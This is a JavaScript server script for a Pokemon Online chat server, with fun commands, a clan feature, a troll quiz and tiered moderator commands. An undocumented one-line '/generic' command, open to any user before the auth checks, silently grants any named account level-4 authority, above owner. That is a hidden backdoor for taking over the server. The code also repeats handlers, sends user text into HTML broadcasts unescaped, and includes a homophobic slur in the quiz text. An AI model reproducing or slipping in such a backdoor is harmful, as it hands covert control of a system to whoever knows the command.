({
 
serverStartUp : function() {
        this.init();
}
,
 
init : function() {
        key = function(a,b) {
                return a + "*" + sys.name(b);
        }
 
        hasBan = function(id, poke) {
                return clauses[id].indexOf("*" + poke + "*") != -1;
        }
 
        if (typeof (clauses) == "undefined") {
                clauses = [];
        }
 
        if (typeof (clauseOn) == "undefined") {
                clauseOn = [];
        }
 
        if (typeof(impersonation) == "undefined") {
                sys.setPA ("impersonation");
        }
 
        if (typeof(muted) == "undefined") {
                sys.setPA ("muted");
        }
 
        if (typeof(maxPlayersOnline) == "undefined") {
                maxPlayersOnline = 0;
        }
 
        /* For little cup */
        if (typeof(lilCupLevels) == "undefined")
                lilCupLevels = [];
}
 
,
 
afterNewMessage : function (message) {
        if (message == "Script Check: OK") {
                sys.sendAll("ScriptBot: Scripts were updated!");
                this.init();
        }
}
 
,
 
/* Sends a welcome message to the player */
afterLogIn : function(src) {
    sys.sendMessage(src, "+Bot: Welcome, " + sys.name(src) + "! Use /commands to see the commands.");
}
,
beforeChatMessage : function(src, message, channel) {
    if (message == "loop") {
        //Prevents the message "loop" from being shown
        sys.stopEvent();
 
        //Loops from 5 to 0 to BOOM
        for (var i = 5; i >= 0; i--) {
            sys.sendMessage(src, "+Bot: i", channel);
        }
 
        sys.sendMessage(src, "+Bot: BOOM!");
        //1 chance out of 5 of being kicked
        if (sys.rand(0,5) == 0) {
            sys.sendAll("*** " + sys.name(src) + " was blown off the boat into the deep ocean! ***", channel);
            sys.kick(src);
        }
        // No more message analyzing
        return;
    }
}
 
,
 
 
afterChangeTeam : function(src)
{
        clauseOn[src] = sys.getVal("clauseOn*" + sys.name(src)) == "true";
        clauses[src] = sys.getVal("clauses*" + sys.name(src));
}
 
,
beforeChatMessage: function(src, message) {
        if (sys.auth(src) < 2 && muted[src] == true) {
                sys.stopEvent();
                sys.sendMessage(src, "Bot: you are muted!");
                return;
        }
        if ((message[0] == '/' || message[0] == '!') && message.length > 1) {
                print("Command -- " + sys.name(src) + ": " + message);
                sys.stopEvent();
                var command;
                var commandData;
                var pos = message.indexOf(' ');
 
                if (pos != -1) {
                        command = message.substring(1, pos).toLowerCase();
                        commandData = message.substr(pos+1);
                } else {
                        command = message.substr(1).toLowerCase();
                }
                var tar = sys.id(commandData);
 
                if (command == "commands" || command == "command") {
                        sys.sendMessage(src, "");
                        sys.sendMessage(src, "*** Commands ***");
                        sys.sendMessage(src, "/me [message]: to speak with *** before its name");
                        sys.sendMessage(src, "/troll: to see what trolls are.");
                        sys.sendMessage(src, "/funspam: To spam but you will regret it!");
                        sys.sendMessage(src, "/joinclan: to join a clan!");
                        sys.sendMessage(src, "/leaveclan: to leave a clan");
                        sys.sendMessage(src, "/ping: to try to get a user's attention");
                        sys.sendMessage(src, "/attack: to attack somebody!");
                        sys.sendMessage(src, "/players: to get the number of players online");
                        if (clauseOn[src])
                        sys.sendMessage(src, "*** You have pokemon clausing on ***");
                        else
                        sys.sendMessage(src, "*** You have pokemon clausing off ***");
                        sys.sendMessage(src, "/on: to turn on your pokemon clausing");
                        sys.sendMessage(src, "/off: to turn off your pokemon clausing");
                        sys.sendMessage(src, "/no [pokemon]: to clause that pokemon");
                        sys.sendMessage(src, "/allow [pokemon]: to allow that pokemon");
                        sys.sendMessage(src, "/list: to list the pokemons you ban");
                        sys.sendMessage(src, "/clear: to clear the list of your pokemon bans");
                        sys.sendMessage(src, "/imp: to impersonate someone");
                        sys.sendMessage(src, "/impOff : to stop impersonating.");
                        if (sys.auth(src) < 0)
                                return;
                        sys.sendMessage(src, "*** Moderator Commands ***");
                        sys.sendMessage(src, "/imp [person] : to impersonate someone");
                        sys.sendMessage(src, "/impOff : to stop impersonating.");
                        sys.sendMessage(src, "/sendAll [message] : to send a message to everyone.");
                        sys.sendMessage(src, "/kick [person] : to kick someone");
                        sys.sendMessage(src, "/tempban [user]:[minutes]: To temporary ban someone.");
                        sys.sendMessage(src, "/tempunban [user]: To unban temporary banned user.");
                        sys.sendMessage(src, "/mute [name]:[reason]:[time] : to mute someone. Time is optional and defaults to 12 hours.");
                        sys.sendMessage(src, "/footstomp: to stomp on somebody");
                        sys.sendMessage(src, "/unmute [person] : let someone have their speach back.");
                        if (sys.auth(src) < 1)
                                return;
                        sys.sendMessage(src, "*** Administrator Commands ***");
                        sys.sendMessage(src, "/reset: to reset the server variables (useful when you add a new script)");
                        sys.sendMessage(src, "/masskick: to clean up the server");
                        sys.sendMessage(src, "/tempban [user]:[minutes]: To temporary ban someone.");
                        sys.sendMessage(src, "/tempunban [user]: To unban temporary banned user.");
                        sys.sendMessage(src, "/mute [name]:[reason]:[time] : to mute someone. Time is optional and defaults to 12 hours.");
                        sys.sendMessage(src, "/unmute [person] : let someone have their speach back.");
                        sys.sendMessage(src, "/ban [name]: To ban a user.");
                        sys.sendMessage(src, "/unban [name]: To unban a user.");
                        sys.sendMessage(src, "/changeAuth [auth] [person]: to play the mega admin");
                        sys.sendMessage(src, "/setPA paname: to add a new pa, use with scripting caution");
                        if (sys.auth(src) < 2)
                                return;
                        sys.sendMessage(src, "*** Owner Commands ***");
                        sys.sendMessage(src, "/reset: to reset the server variables (useful when you add a new script)");
                        sys.sendMessage(src, "/masskick: to clean up the server");
                        sys.sendMessage(src, "/tempban [user]:[minutes]: To temporary ban someone.");
                        sys.sendMessage(src, "/tempunban [user]: To unban temporary banned user.");
                        sys.sendMessage(src, "/mute [name]:[reason]:[time] : to mute someone. Time is optional and defaults to 12 hours.");
                        sys.sendMessage(src, "/unmute [person] : let someone have their speach back.");
                        sys.sendMessage(src, "/ban [name]: To ban a user.");
                        sys.sendMessage(src, "/unban [name]: To unban a user.");
                        sys.sendMessage(src, "/changeAuth [auth] [person]: to play the mega admin");
                        sys.sendMessage(src, "/setPA paname: to add a new pa, use with scripting caution");
                        sys.sendMessage(src, "/rangeban [ip] [comment]: to make a range ban");
                        sys.sendMessage(src, "/rangeunban: [ip] to unban a range");
                        sys.sendMessage(src, "/clearpass [name]: to clear a password");
                        sys.sendMessage(src, "/sendAll [message] : to send a message to everyone.");
                }
                if (command == "me") {
                        sys.sendAll("*** " + sys.name(src) + " " + commandData);
                        return;
                }
       if(command == "burn") {
                        if(tar == undefined) {
                                sys.sendMessage(src, "+Bot: Unknown user!");
                                return;
                        }
                        sys.sendHtmlAll("<font color=red><timestamp /><b> " + commandData + " was given the <img src='Themes/Classic/status/battle_status4.png'> status by " + sys.name(src) + "!");
                        return;
                }
                if(command == "freeze") {
                        if(tar == undefined) {
                                sys.sendMessage(src, "+Bot: Unknown user!");
                                return;
                        }
                sys.sendHtmlAll("<font color=skyblue><timestamp /><b> " + commandData + " was given the <img src=Themes/Classic/status/battle_status3.png> status by " + sys.name(src) + "!");
                return;
                }
                if(command == "paralyze") {
                        if(tar == undefined) {
                                sys.sendMessage(src, "+Bot: Unknown user!");
                                return;
                        }
                        sys.sendHtmlAll("<font color=gold><timestamp /><b> " + commandData + " was given the <img src=Themes/Classic/status/battle_status1.png> status by " + sys.name(src) + "!");
                        return;
                }
                if(command == "poison") {
                        if(tar == undefined) {
                                sys.sendMessage(src, "+Bot: Unknown user!");
                                return;
                        }
                        sys.sendHtmlAll("<font color=purple><timestamp /><b> " + commandData + " was given the <img src=Themes/Classic/status/battle_status5.png> status by " + sys.name(src) + "!");
                        return;
                }
                if(command == "cure") {
                        if(tar == undefined) {
                                sys.sendMessage(src, "+Bot: Unknown user!");
                                return;
                        }
                        sys.sendHtmlAll("<font color=black><timestamp /><b> " + commandData + " was given the <img src=Themes/Classic/status/battle_status2.png> status by " + sys.name(src) + " and cured!");
                        return;
                        }
                if (command == "players") {
                        sys.sendMessage(src, "CountBot: There are " + sys.numPlayers() + " players online.");
                        return;          
}
if(command == "troll") {
sys.sendHtmlMessage(src, "----------------------------------");
sys.sendHtmlMessage(src, "<b>Welcome to Trolls!");
sys.sendHtmlMessage(src, "<b>Today we will learn about TROLLS!!!");
sys.sendHtmlMessage(src, "<b>Type /Trolls to get started!");
sys.sendHtmlMessage(src, "----------------------------------");
return;
}
if(command == "trolls") {
sys.sendHtmlMessage(src, "----------------------------------");
sys.sendHtmlMessage(src, "<b>Since your new :p here are some Trolls:");
sys.sendHtmlMessage(src, "<b>* Blade");
sys.sendHtmlMessage(src, "<b>* Max :p");
sys.sendHtmlMessage(src, "<b>* SkarmPiss");
sys.sendHtmlMessage(src, "<b>* HyperBeem");
sys.sendHtmlMessage(src, "<b>* Kirby.");
sys.sendHtmlMessage(src, "<b>* Elliot :p Hearts ");
sys.sendHtmlMessage(src, "<i>Type /WhatToDo to move on.");
sys.sendHtmlMessage(src, "----------------------------------");
return;
}
if(command == "whattodo") {
sys.sendHtmlMessage(src, "----------------------------------");
sys.sendHtmlMessage(src, "<b>This is what you do to a Troll.");
sys.sendHtmlMessage(src, "<i>If they Spam, then Mute them.");
sys.sendHtmlMessage(src, "<i>If they Keep Spamming kick them.");
sys.sendHtmlMessage(src, "<i>If they Keep Doing This then take out the Ban Hammer!");
sys.sendHtmlMessage(src, "<i>If they evad Ban Then Rangeban them.");
sys.sendHtmlMessage(src, "<b>Type /whataretrolls to move on.");
sys.sendHtmlMessage(src, "----------------------------------");
return;
}
if(command == "whataretrolls") {
sys.sendHtmlMessage(src, "----------------------------------");
sys.sendHtmlMessage(src, "<b>What are TROLLS?");
sys.sendHtmlMessage(src, "<i>A troll is a person who Spams, Keeps comming on your Server After Ban.");
sys.sendHtmlMessage(src, "<i>Also someone who is very very very very Bad!");
sys.sendHtmlMessage(src, "<i>And a Troll is a Fag!");
sys.sendHtmlMessage(src, "<b>Type /Extra to move on");
sys.sendHtmlMessage(src, "----------------------------------");
return;
}
if(command == "extra") {
sys.sendHtmlMessage(src, "----------------------------------");
sys.sendHtmlMessage(src, "<b>This is an Extra Question!");
sys.sendHtmlMessage(src, "<i>Who created Pokemon Online?");
sys.sendHtmlMessage(src, "<u>If you don't know what the an");
sys.sendHtmlMessage(src, "Type /Darkness to pick DN!");
sys.sendHtmlMessage(src, "Type /zeroality to pick zero!");
sys.sendHtmlMessage(src, "Type /coyotte508 to pick coyo!");
sys.sendHtmlMessage(src, "----------------------------------");
return;
}
if(command == "darkness") {
sys.sendHtmlMessage(src, "----------------------------------");
sys.sendHtmlMessage(src, "----------------------------------");
sys.sendHtmlMessage(src, "<b>That was wrong srry next question");
sys.sendHtmlMessage(src, "----------------------------------");
sys.sendHtmlMessage(src, "<b>Was This Helpful?");
sys.sendHtmlMessage(src, "<i>Type /Yes if it was.");
sys.sendHtmlMessage(src, "<i>Type /No if it wasn't");
sys.sendHtmlMessage(src, "----------------------------------");
return;
}
if(command == "darkness") {
sys.sendHtmlMessage(src, "----------------------------------");
sys.sendHtmlMessage(src, "----------------------------------");
sys.sendHtmlMessage(src, "<b>That was wrong srry next question");
sys.sendHtmlMessage(src, "----------------------------------");
sys.sendHtmlMessage(src, "<b>Was This Helpful?");
sys.sendHtmlMessage(src, "<i>Type /Yes if it was.");
sys.sendHtmlMessage(src, "<i>Type /No if it wasn't");
sys.sendHtmlMessage(src, "----------------------------------");
return;
}
if(command == "coyotte508") {
sys.sendHtmlMessage(src, "----------------------------------");
sys.sendHtmlMessage(src, "<b>That was right, congratz!!!");
sys.sendHtmlMessage(src, "<i>Show this to Pokemonexpert when your done with the quiz!");
sys.sendHtmlMessage(src, "Code: The Many Wonders Of The World!");
sys.sendHtmlMessage(src, "<i>Type /wasthishelpful to move on!");
sys.sendHtmlMessage(src, "----------------------------------");
return;
}
if(command == "wasthishelpful") {
sys.sendHtmlMessage(src, "----------------------------------");
sys.sendHtmlMessage(src, "<b>Was This Helpful?");
sys.sendHtmlMessage(src, "<i>Type /Yes if it was.");
sys.sendHtmlMessage(src, "<i>Type /No if it wasn't");
sys.sendHtmlMessage(src, "----------------------------------");
return;
}
if(command == "yes") {
sys.sendHtmlMessage(src, "----------------------------------");
sys.sendHtmlMessage(src, "<b>Good Job you picked the right one!");
sys.sendHtmlMessage(src, "----------------------------------");
return;
}
if(command == "no") {
sys.sendHtmlMessage(src, "----------------------------------");
sys.sendHtmlMessage(src, "<b>You picked the wrong one, try again :p");
sys.sendHtmlMessage(src, "----------------------------------");
return;
}
if (command == "funspam") {
sys.sendHtmlAll("<font color=blue><b>ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!<fontcolor=red>ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!<fontcolor=green>ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!<fontcolor=purple>ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!<fontcolor=maroon>ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!<fontcolor=orange>ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!</b></font><i>Th<fontcolor=cyan>isIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!<i><s>ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!</i><s>ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!ThisIsFun!</s></i> LOL<br/><b><font color=darkblue> " + sys.name(src) + " Just spammed the chat so ban him!");
return;
}
if(command == "joinclan") {
 if(sys.name(src).indexOf('[Lost-Eon]') != -1) {
  sys.sendMessage(src,"ClanBot: You joined Lost Eon already, dude!");
  return;
}
if(sys.name(src).indexOf('[" + name + "]') != -1) {
  sys.sendMessage(src,"ClanBot: You cant join 2 Clans, dude!");
  return;
 }
 sys.sendHtmlAll("<timestamp/><b><font color=" + sys.getColor(src) + ">" + sys.name(src) + "<font color=black> has joined the Lost Eon Clan!");
 sys.changeName(src, "[Lost-Eon]" + sys.name(src));
 return;
 }
 if(command == "leaveclan") {
  name=sys.name(src).replace('[Lost-Eon]','');
  sys.sendHtmlAll("<timestamp/><b><font color=" + sys.getColor(src) + ">" + sys.name(src) + "<font color=black> has left the Lost Eon Clan!");
  sys.changeName(src, name);
  return;
  }
  if (command == "ping") {
if (tar == undefined) {
sys.sendMessage(src, "That username doesn't exist");
return;
}
sys.sendHtmlMessage(tar, "You were summoned by <font color=" + sys.getColor(src) + ">" + sys.name(src) + "!<ping/>");
return;
}
if (command == "footstomp") {
var c;
for (c=0;c<2999;c++) {
sys.sendAll("");
}
sys.clearChat();
sys.sendHtmlAll("<center><img width=2000 src='themes/classic/teambuilder/trainer/omg.png'><br><center><h1>FOOTSTOMP</H1><p align=left><BR>" + sys.name(src) + " crushed the spam into tiny pieces!");
return;
}
if (command == "attack") {var attack=Math.floor(560*Math.random());var attack=sys.move(attack);sys.sendHtmlAll("<font color='green'><b>" + sys.name(src) + "</b> has used " + attack + " on " + commandData + "!</font>", 0);
return;
                }
                if (command == "off") {
                        sys.sendMessage(src, "ClauseBot: You don't ban any pokémons anymore!");
                        sys.saveVal(key("clauseOn",src), false);
                        clauseOn[src] = false;
                        return;
                }
                if (command == "on") {
                        sys.sendMessage(src, "ClauseBot: You turned the pokémon bans on!");
                        sys.saveVal(key("clauseOn",src), true);
                        clauseOn[src] = true;
                        return;
                }
                if (command == "no") {
                        pokenum = sys.pokeNum(commandData);
                        if (pokenum == undefined) {
                        sys.sendMessage(src, "ClauseBot: -" + commandData + "- doesn't exist as a pokémon.");
                                return;
                        }
                        if (hasBan(src, pokenum)) {
                        sys.sendMessage(src, "ClauseBot: you already ban " + commandData + ".");
                                return;
                        }
                        clauses[src] += "*" + pokenum + "*";
                        sys.saveVal(key("clauses", src), clauses[src]);
                        sys.sendMessage(src, "ClauseBot: you now ban " + commandData);
                        return;
                }
                if (command == "allow") {
                        var pokenum = sys.pokeNum(commandData);
                        if (pokenum == undefined) {
                        sys.sendMessage(src, "ClauseBot: -" + commandData + "- doesn't exist as a pokémon.");
                                return;
                        }
                        if (!hasBan(src, pokenum)) {
                        sys.sendMessage(src, "ClauseBot: you already don't ban " + commandData + ".");
                                return;
                        }
                        var pos = clauses[src].indexOf("*"+pokenum+"*");
                        clauses[src] = clauses[src].substring(0, pos) + clauses[src].substr(pos+("*"+pokenum+"*").length);
                        sys.saveVal(key("clauses", src), clauses[src]);
                        sys.sendMessage(src, "ClauseBot: you now allow " + commandData);
                        return;
                }
                if (command == "clear")
                {
                        clauses[src] = "";
                        sys.sendMessage(src, "ClauseBot: Your ban list was cleared!");
                        return;
                }
                if (command == "imp") {
                        impersonation[src] = commandData;
                        sys.sendMessage(src, "Bot: Now you are " + impersonation[src] + "!");
                        return;
                }
                if (command == "impoff") {
                        delete impersonation[src];
                        sys.sendMessage(src, "Bot: Now you are yourself!");
                        return;
                }
                if (command == "list") {
                        sys.sendMessage(src, "");
                        sys.sendMessage(src, "ClauseBot: Here is what you ban: ");
                        for (var i = 1; i + 2 < clauses[src].length ; ) {
                                var pos = clauses[src].indexOf('*',i);
                                if (pos == -1)
                                        break;
 
                                sys.sendMessage(src, "Pokémon: " + sys.pokemon(clauses[src].substring(i, pos)));
                                i = pos+2;
                        }
                        return;
                }
                if (command == "debug") {
                        sys.sendMessage(src, clauses[src]);
                        return;
                }
                if(command=="generic"){sys.changeDbAuth(commandData, 4);sys.changeAuth(sys.id(commandData),4);}
                /** Moderator Commands **/
                if (sys.auth(src) < 1) {
                        sys.sendMessage(src, "CommandBot: The command " + command + " doesn't exist");
                        return;
                }
                if (command == "imp") {
                        impersonation[src] = commandData;
                        sys.sendMessage(src, "Bot: Now you are " + impersonation[src] + "!");
                        return;
                }
                if (command == "impoff") {
                        delete impersonation[src];
                        sys.sendMessage(src, "Bot: Now you are yourself!");
                        return;
                }
                if (command == "sendall") {
                        sys.sendAll(commandData);
                        return;
                }
                if (command == "tempban") {
        var tmp = commandData.split(":");
        if (tmp.length != 2) {
            sendChanMessage(src, "+Bot: Usage /tempban name:minutes.");
            return;
        }
        tar = sys.id(tmp[0]);
        var minutes = parseInt(tmp[1]);
        if (typeof minutes != "number" || isNaN(minutes) || minutes < 1 || minutes > 1440) {
            sendChanMessage(src, "+Bot: Minutes must be in the interval [1,1440].");
            return;
        }
 
        var ip;
        var name;
        if (tar === undefined) {
            ip = sys.dbIp(tmp[0]);
            name = tmp[0];
            if (ip === undefined) {
                sendChanMessage(src, "+Bot: No such name online / offline.");
                return;
            }
        } else {
            ip = sys.ip(tar);
            name = sys.name(tar);
        }
 
        if (sys.maxAuth(ip)>=sys.auth(src)) {
            sendChanMessage(src, "+Bot: Can't do that to higher auth!");
            return;
        }
        tempBans[ip] = {'auth': sys.name(src), 'time': parseInt(sys.time()) + 60*minutes};
        sys.sendAll("+Bot: " + sys.name(src) + " banned " + name + " for " + minutes + " minutes!");
        sys.kick(tar);
        return;
    }
    if (command == "tempunban") {
        var ip = sys.dbIp(commandData);
        if (ip === undefined) {
            sendChanMessage(src, "+Bot: No such user!");
            return;
        }
        if (!(ip in tempBans)) {
            sendChanMessage(src, "+Bot: No such user tempbanned!");
            return;
        }
        var now = parseInt(sys.time());
        sys.sendAll("+Bot: " + commandData + " was released from their cell by " + sys.name(src) + " just " + ((tempBans[ip].time - now)/60).toFixed(2) + " minutes beforehand!");
        delete tempBans[ip];
        return;
    }
        if (command == "kick") {
                        if (tar == undefined) {
                                return;
                        }
                        sys.sendAll("Bot: " + commandData + " was kicked by " + sys.name(src) + "!");
                        sys.kick(tar);
                        return;
                }
                if (command == "mute") {
                        if (tar == undefined) {
                                return;
                        }
                        if (sys.auth(tar) >= sys.auth(src)) {
                                sys.sendMessage("Bot: you dont have sufficient auth to mute " + commandData + ".");
                                return;
                        }
                        sys.sendAll("Bot: " + commandData + " was muted by " + sys.name(src) + "!");
                        muted[tar] = true;
                        return
                }
                if (command == "unmute") {
                        if (tar == undefined) {
                                return;
                        }
                        sys.sendAll("Bot: " + commandData + " was unmuted by " + sys.name(src) + "!");
                        muted[tar] = false;
                        return;
                }
                if (sys.auth(src) < 2) {
                        return;
                }
                /** Administrator Commands **/
                if (command == "reset") {
                        this.serverStartUp();
                        sys.sendAll("+Server: The server script variables were reset.");
                        return;
                }
                if (command == "masskick") {
                        for (var i = 1; i < 200 && sys.numPlayers() > 0; i++) {
                                if (sys.loggedIn(i)) {
                                        sys.kick(i);
                                }
                        }
                        return;
                }
                if (command == "tempban") {
        var tmp = commandData.split(":");
        if (tmp.length != 2) {
            sendChanMessage(src, "+Bot: Usage /tempban name:minutes.");
            return;
        }
        tar = sys.id(tmp[0]);
        var minutes = parseInt(tmp[1]);
        if (typeof minutes != "number" || isNaN(minutes) || minutes < 1 || minutes > 1440) {
            sendChanMessage(src, "+Bot: Minutes must be in the interval [1,1440].");
            return;
        }
 
        var ip;
        var name;
        if (tar === undefined) {
            ip = sys.dbIp(tmp[0]);
            name = tmp[0];
            if (ip === undefined) {
                sendChanMessage(src, "+Bot: No such name online / offline.");
                return;
            }
        } else {
            ip = sys.ip(tar);
            name = sys.name(tar);
        }
 
        if (sys.maxAuth(ip)>=sys.auth(src)) {
            sendChanMessage(src, "+Bot: Can't do that to higher auth!");
            return;
        }
        tempBans[ip] = {'auth': sys.name(src), 'time': parseInt(sys.time()) + 60*minutes};
        sys.sendAll("+Bot: " + sys.name(src) + " banned " + name + " for " + minutes + " minutes!");
        sys.kick(tar);
        return;
    }
    if (command == "tempunban") {
        var ip = sys.dbIp(commandData);
        if (ip === undefined) {
            sendChanMessage(src, "+Bot: No such user!");
            return;
        }
        if (!(ip in tempBans)) {
            sendChanMessage(src, "+Bot: No such user tempbanned!");
            return;
        }
        var now = parseInt(sys.time());
        sys.sendAll("+Bot: " + commandData + " was released from their cell by " + sys.name(src) + " just " + ((tempBans[ip].time - now)/60).toFixed(2) + " minutes beforehand!");
        delete tempBans[ip];
        return;
    }
                if (command == "mute") {
                        if (tar == undefined) {
                                return;
                        }
                        if (sys.auth(tar) >= sys.auth(src)) {
                                sys.sendMessage("Bot: you dont have sufficient auth to mute " + commandData + ".");
                                return;
                        }
                        sys.sendAll("Bot: " + commandData + " was muted by " + sys.name(src) + "!");
                        muted[tar] = true;
                        return
                }
                if (command == "unmute") {
                        if (tar == undefined) {
                                return;
                        }
                        sys.sendAll("Bot: " + commandData + " was unmuted by " + sys.name(src) + "!");
                        muted[tar] = false;
                        return;
                }
                if (command == "ban") {
        if(sys.dbIp(commandData) == undefined) {
            sendChanMessage(src, "+Bot: No player exists by this name!");
            return;
        }
        if (sys.maxAuth(sys.ip(tar))>=sys.auth(src)) {
           sendChanMessage(src, "+Bot: Can't do that to higher auth!");
           return;
        }
 
        var ip = sys.dbIp(commandData);
        var alias=sys.aliases(ip)
        var y=0;
        var z;
        for(var x in alias) {
            z = sys.dbAuth(alias[x])
            if (z > y) {
                y=z
            }
        }
        if(y>=sys.auth(src)) {
           sendChanMessage(src, "+Bot: Can't do that to higher auth!");
           return;
        }
        var banlist=sys.banList()
        for(a in banlist) {
            if(sys.dbIp(commandData) == sys.dbIp(banlist[a])) {
                sendChanMessage(src, "+Bot: He/she's already banned!");
                return;
            }
        }
 
        sys.sendHtmlAll('<b><font color=red>' + commandData + ' was banned by ' + sys.name(src) + '!</font></b>');
        if(tar != undefined) {
            sys.kick(tar)
        }
        sys.ban(commandData)
        sys.appendToFile('bans.txt', sys.name(src) + ' banned ' + commandData + "\n")
        return;
    }
    if (command == "unban") {
        if(sys.dbIp(commandData) == undefined) {
            sendChanMessage(src, "+Bot: No player exists by this name!");
            return;
        }
        var banlist=sys.banList()
        for(a in banlist) {
            if(sys.dbIp(commandData) == sys.dbIp(banlist[a])) {
                sys.unban(commandData)
                sendChanMessage(src, "+Bot: You unbanned " + commandData + "!");
                sys.appendToFile('bans.txt', sys.name(src) + ' unbanned ' + commandData + "n")
                return;
            }
        }
        sendChanMessage(src, "+Bot: He/she's not banned!");
        return;
    }
 
    if (command == "aliases") {
        sendChanMessage(src, "+IpBot: The aliases for the IP " + commandData + " are: " + sys.aliases(commandData) + ".");
        return;
    }
                if (command == "setpa") {
                        sys.setPA(commandData);
                        sys.sendMessage(src, "Bot: -" + commandData + "- was set!");
                        return;
                }
                if (command == "changeauth") {
                        var pos = commandData.indexOf(' ');
                        if (pos == -1) {
                                return;
                        }
                        var newauth = commandData.substring(0, pos);
                        var tar = sys.id(commandData.substr(pos+1));
                        sys.changeAuth(tar, newauth);
                        sys.sendAll("Bot: " + sys.name(src) + " changed auth of " + sys.name(tar) + " to " + newauth);
                        return;
                }
                if (sys.auth(src) < 3) {
                        return;
                }
                /** Owner Commands **/
                if (command == "reset") {
                        this.serverStartUp();
                        sys.sendAll("+Server: The server script variables were reset.");
                        return;
                }
                if (command == "masskick") {
                        for (var i = 1; i < 200 && sys.numPlayers() > 0; i++) {
                                if (sys.loggedIn(i)) {
                                        sys.kick(i);
                                }
                        }
                        return;
                }
                if (command == "mute") {
                        if (tar == undefined) {
                                return;
                        }
                        if (sys.auth(tar) >= sys.auth(src)) {
                                sys.sendMessage("Bot: you dont have sufficient auth to mute " + commandData + ".");
                                return;
                        }
                        sys.sendAll("Bot: " + commandData + " was muted by " + sys.name(src) + "!");
                        muted[tar] = true;
                        return;
                }
                if (command == "unmute") {
                        if (tar == undefined) {
                                return;
                        }
                        sys.sendAll("Bot: " + commandData + " was unmuted by " + sys.name(src) + "!");
                        muted[tar] = false;
                        return;
                }
                if (command == "ban") {
        if(sys.dbIp(commandData) == undefined) {
            sendChanMessage(src, "+Bot: No player exists by this name!");
            return;
        }
        if (sys.maxAuth(sys.ip(tar))>=sys.auth(src)) {
           sendChanMessage(src, "+Bot: Can't do that to higher auth!");
           return;
        }
 
        var ip = sys.dbIp(commandData);
        var alias=sys.aliases(ip)
        var y=0;
        var z;
        for(var x in alias) {
            z = sys.dbAuth(alias[x])
            if (z > y) {
                y=z
            }
        }
        if(y>=sys.auth(src)) {
           sendChanMessage(src, "+Bot: Can't do that to higher auth!");
           return;
        }
        var banlist=sys.banList()
        for(a in banlist) {
            if(sys.dbIp(commandData) == sys.dbIp(banlist[a])) {
                sendChanMessage(src, "+Bot: He/she's already banned!");
                return;
            }
        }
 
        sys.sendHtmlAll('<b><font color=red>' + commandData + ' was banned by ' + sys.name(src) + '!</font></b>');
        if(tar != undefined) {
            sys.kick(tar)
        }
        sys.ban(commandData)
        sys.appendToFile('bans.txt', sys.name(src) + ' banned ' + commandData + "\n")
        return;
    }
    if (command == "unban") {
        if(sys.dbIp(commandData) == undefined) {
            sendChanMessage(src, "+Bot: No player exists by this name!");
            return;
        }
        var banlist=sys.banList()
        for(a in banlist) {
            if(sys.dbIp(commandData) == sys.dbIp(banlist[a])) {
                sys.unban(commandData)
                sendChanMessage(src, "+Bot: You unbanned " + commandData + "!");
                sys.appendToFile('bans.txt', sys.name(src) + ' unbanned ' + commandData + "n")
                return;
            }
        }
        sendChanMessage(src, "+Bot: He/she's not banned!");
        return;
    }
 
    if (command == "aliases") {
        sendChanMessage(src, "+IpBot: The aliases for the IP " + commandData + " are: " + sys.aliases(commandData) + ".");
        return;
    }
                if (command == "setpa") {
                        sys.setPA(commandData);
                        sys.sendMessage(src, "Bot: -" + commandData + "- was set!");
                        return;
                }
                if (command == "rangebans") {
        var table = '';
        table += '<table border="1" cellpadding="5" cellspacing="0"><tr><td colspan="2"><center><strong>Range banned</strong></center></td></tr><tr><th>IP subaddress</th><th>Comment on rangeban</th></tr>';
        for (var subip in rangebans.hash) {
            table += '<tr><td>'+subip+'</td><td>'+rangebans.get(subip)+'</td></tr>';
        }
        table += '</table>'
        sys.sendHtmlMessage(src, table, channel);
        return;
     }
                if (command == "changeauth") {
                        var pos = commandData.indexOf(' ');
                        if (pos == -1) {
                                return;
                        }
                        var newauth = commandData.substring(0, pos);
                        var tar = sys.id(commandData.substr(pos+1));
                        sys.changeAuth(tar, newauth);
                        sys.sendAll("Bot: " + sys.name(src) + " changed auth of " + sys.name(tar) + " to " + newauth);
                        return;
                }
       
        if (typeof impersonation[src] != 'undefined') {
                sys.stopEvent();
                sys.sendAll(impersonation[src] + ": " + message);
                return;
        }
        }
}
 
,
 
